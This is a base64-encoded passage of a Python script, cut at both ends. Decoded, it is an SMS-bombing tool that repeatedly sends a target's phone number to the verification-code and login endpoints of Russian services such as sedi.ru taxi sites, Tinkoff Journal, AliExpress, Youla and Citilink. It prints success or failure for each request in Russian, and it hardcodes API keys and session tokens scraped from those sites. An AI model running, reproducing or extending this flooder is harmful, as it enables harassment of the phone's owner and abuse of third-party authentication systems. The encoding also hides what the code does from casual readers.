bGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDU1OTc4MzQ0NTYwMzM5NjRfMTY0MTA3MjIxMzgyNiZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9OTc2QjgyOTItMDg2RS00RDM3LThCNjctMEY1NkVDNDlFNzFFJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ0YXhpZGVzaGV2by5jb20lMkZsb2dpbiZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTQ3JnN0b2tlbj1jZTA0Yjk3MjI3ZjA2OWExZDk1OGJkZjU1NmI4Y2NkOSZfPTE2NDEwNzIyMTM4MzAnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTI1MkInICsgc3RyKHBob25lKVs6LTEwXSArICclMjUyMCgnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArICclMjUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3NlZGkucnUvd2ViYXBpP2NhbGxiYWNrPWpRdWVyeTE5MTA3MzgwNTM3ODc0MTQ3OTQ3XzE2NDEwNzMzNTEwNTMmcT1nZXRfYWN0aXZhdGlvbl9rZXkmcGhvbmU9e30md2F5PWJ5c21zJnVzZXJ0eXBlPWN1c3RvbWVyJmxhbmc9cnUtUlUmYXBpa2V5PUE3OTRCNTIzLUYxRkQtNEMyNy04NkVGLUJBNDZDQ0JBNzJEMCZkZWJ1Z2luZm89R01UJTJCMDMwMCsoTVNLKStUWi0xODArTk9fQ09PS0lFKzE0NDB4OTAwK2h0dHBzJTNBJTJGJTJGdGF4aS1wcm90YXhpLnJ1JTJGemFrYXphdC10YWtzaSUyRitVc2VyJTI1MjBkZW5pZWQlMjUyMEdlb2xvY2F0aW9uJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1NDcmc3Rva2VuPWVhNzk1ZjIxODBhY2RiOWVjYmNjZGNlOWJlZmRiM2ZiJl89MTY0MTA3MzM1MTA1OScuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc3BiMi5zZWRpLnJ1L3dlYmFwaT9jYWxsYmFjaz1qUXVlcnkxOTEwOTQwMDc5NDg1MzM3NDIyMV8xNjQxMDc0MDM4MDExJnE9Z2V0X2FjdGl2YXRpb25fa2V5JnBob25lPXt9JndheT1ieXNtcyZ1c2VydHlwZT1jdXN0b21lciZsYW5nPXJ1LVJVJmFwaWtleT0yNzA1NTFENC0yNEJBLTQ1NjMtQjc4Ri0zMDUxM0MwOTJFQ0QmZGVidWdpbmZvPUdNVCUyQjAzMDArKE1TSykrVFotMTgwK05PX0NPT0tJRSsxNDQweDkwMCtodHRwcyUzQSUyRiUyRnRheGkteC5ydSUyRitVc2VyJTI1MjBkZW5pZWQlMjUyMEdlb2xvY2F0aW9uJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1NDcmc3Rva2VuPTQ4Y2E3YWZjZjAzYWQwOWE5ZTE3ZjExYTk0MTE5OGM0Jl89MTY0MTA3NDAzODAxNScuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDUyNzM2OTQyMDMxMzA5MjlfMTY0MTA3NDY5ODI1MyZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9QzEzMjBCODYtOTdBOC00MDVCLUE0M0MtQTNENzk0NjVCQzVGJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ0YWtzaS5ieiUyRmxpY2huaXkta2FiaW5ldC5odG1sJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1NDcmc3Rva2VuPTg5OGRjYjhjYTZiNmJhYmM1MDI0NDc1ZmU4NzQ2NzAxJl89MTY0MTA3NDY5ODI1NycuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vbXNrMS5zZWRpLnJ1L3dlYmFwaT9jYWxsYmFjaz1qUXVlcnkxOTEwMDk4NTE3MDE2MTM3NDg5MzFfMTY0MTA3NTQ2Mjc2NyZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9OWZkZjkzMDItMjVjYy00YTAyLWFkMWItMzM1ZGI1NmZiYjQxJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ4dGF4aS5ydSUyRiUyMytVc2VyJTI1MjBkZW5pZWQlMjUyMEdlb2xvY2F0aW9uJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1MDQmc3Rva2VuPWU3ZDFkOWU2MDM5YWE2ZjVmYWEyNGZmZjE2YmRmNzhmJl89MTY0MTA3NTQ2Mjc3MCcuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDg2MjcxOTQ4NDYwMTM1OTdfMTY0MTA3NjI1Njk5OCZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9QTYwREE5NDAtQjlFNS00RjFCLTk3MzQtN0NDODZCOUJGMTRGJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ0YXhpLXBvLXB1dGkucnUlMkZ6YWtheiUyRiZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTQ3JnN0b2tlbj1kMTM3MjE0OGQxZDFjOGM0ZDFkZWYyNjE3MmQzM2U0ZiZfPTE2NDEwNzYyNTcwMDUnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTI1MkInICsgc3RyKHBob25lKVs6LTEwXSArICclMjUyMCgnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArICclMjUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3NwYjIuc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDk3NjcyOTM1OTc4ODE0MTdfMTY0MTA3NjMzNDk0MiZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9RTkxNzI3REMtQkYxOC00MDQ2LUIzNDUtMDczOTlFQjVENzIxJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ1dGF4aS1zcGIucnUlMkYrVXNlciUyNTIwZGVuaWVkJTI1MjBHZW9sb2NhdGlvbiZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTQ3JnN0b2tlbj03NGRhNGJkMWZmZjVhZTRhYTRkYTZiNmRjYTViMTg2NyZfPTE2NDEwNzYzMzQ5NDYnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTI1MkInICsgc3RyKHBob25lKVs6LTEwXSArICclMjUyMCgnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArICclMjUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5tc2suc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDUzOTM3NDEzODg4NDk0NDVfMTY0MTExMjc4NDY0MiZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9ZTlkMzY5NDYtZTkxNi00Y2FmLWI5NzctYTc4YjVjZGVhYTExJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cCUzQSUyRiUyRnd3dy50YXhpZXVyb3BsdXMucnUlMkZvbmxheW4temFrYXouaHRtbCZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTA0JnN0b2tlbj01ZTAxOWQ3NTk4M2I3ODQxYjgyZmQ3M2NkYThhYTI0NiZfPTE2NDExMTI3ODQ2NDYnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJyAnICsgc3RyKHBob25lKVsxOi03XSArICcgJyArIHN0cihwaG9uZSlbNDotNF0gKyAnICcgKyBzdHIocGhvbmUpWzc6LTJdICsgJyAnICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3NvY2lhbC5qb3VybmFsLnRpbmtvZmYucnUvYXBpL3YyMC9hY2NvdW50L2xvZ2luL3Bob25lLycsIGpzb249eyJwaG9uZSI6ZW50ZXIsInBvaW50X29mX2NvbnRhY3QiOiJoZWFkZXItbG9naW4tYnV0dG9uIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncm91cHByaWNlLnJ1L2F1dGhfcGhvbmUvc2VuZF9waG9uZV90b2tlbicsIGRhdGE9eydwaG9uZSc6IGVudGVyLCd0aW1lX3pvbmUnOiAxODB9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJzgnICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIGhlYWQgPSB7J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE1LjIgU2FmYXJpLzYwNS4xLjE1J30KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy50cmFla3RvcmlhLnJ1L2xvY2FsL2FqYXgvYXV0aG9yaXplLnBocD9hY3Rpb249MicsaGVhZGVycz1oZWFkLCBkYXRhPXsncGhvbmUnOiBlbnRlciwnYnhzZXNzaWQnOiAnMjE2NmU2OWUxOTM3Njk0ODZkNjhiY2VhODIxZjI5YmYnLCdsaWQnOiAndHInfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgY3ljbGUgKz0gMQogICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsnICsgRm9yZS5DWUFOICsgc3RyKGN5Y2xlKSArIEZvcmUuQkxVRSArICcg0YbQuNC60Lsg0L/RgNC+0LnQtNC10L1dJykKICAgIAogICAgZWxzZToKICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFvQmtC+0LvQuNGH0LXRgdGC0LLQviDRhtC40LrQu9C+0LJdOiAnICsgRm9yZS5DWUFOICsgc3RyKGNvdW50KSkKICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFvQlNC70Y8g0L7RgdGC0LDQvdC+0LLQutC4INC90LDQttC80LggJyArIEZvcmUuQ1lBTiArICdDdHJsICsgWicgKyBGb3JlLkJMVUUgKyAnXScpCiAgICAgICAgZm9yIGN5Y2xlIGluIHJhbmdlKGNvdW50KToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJy0nICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vbG9naW4uYWxpZXhwcmVzcy5ydS9qb2luL1ByZUNoZWNrRm9yUGhvbmVSZWdpc3Rlci5odG0/Y2VsbFBob25lPXt9fSZ1bWlkVG9rZW49VDJnQU9KWXpjbC1CRWIwQjlwVnZUX3hKb2Q1aFlLamJ1WnhidG1BSEtjSy1fb2wwdGdaUEVkS0NiZC1fSk12NzlMTSUzRCZ1YT0lNUJvYmplY3QrUHJvbWlzZSU1RCZyZWdpc3RlckZyb209QUVfTUFJTl9SRUdJU1RFUiIuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3lvdWxhLnJ1L3dlYi1hcGkvYXV0aC9yZXF1ZXN0X2NvZGUiLCBkYXRhPXsicGhvbmUiOiBlbnRlcn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vd3d3LmNpdGlsaW5rLnJ1L3JlZ